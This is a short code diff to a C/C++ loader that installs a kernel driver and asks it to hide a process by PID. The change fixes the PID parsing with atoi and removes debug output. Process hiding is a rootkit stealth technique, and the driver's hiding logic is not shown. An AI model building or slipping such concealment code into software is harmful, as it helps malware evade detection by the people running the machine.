@@ -35,7 +35,6 @@ bool hideProcess(char* driverName, int pid);
 
 int main(int argc, char *argv[])
 {
-	printf("lasterr: %d\n", GetLastError());
 	Logs::log = new Log();
 	Logs::log->WriteLine("\n\nstarted...\n");
 	if (argc < 2)
@@ -52,7 +51,7 @@ int main(int argc, char *argv[])
 	sprintf(buff, "sc delete %s", driverName);
 	system(buff);
 #endif
-	if (loadSysFile(driverName, displayName) && hideProcess(displayName, (int)argv[1])) //(int)argv[1]);)//"friendly driver"))//argv[1]);
+	if (loadSysFile(driverName, displayName) && hideProcess(displayName, atoi(argv[1]))) // atoi = string argument to integer
 		printf("success\n");
 	else
 		printf("failure\n");
@@ -219,7 +218,5 @@ bool hideProcess(char * driverName, int pid)
 		printf("\nError: Unable to hide process (%d)\n", GetLastError());
 		return FALSE;
 	}
-	else
-		printf("\nProcess successfully hidden.\n");
 	return TRUE;
 }
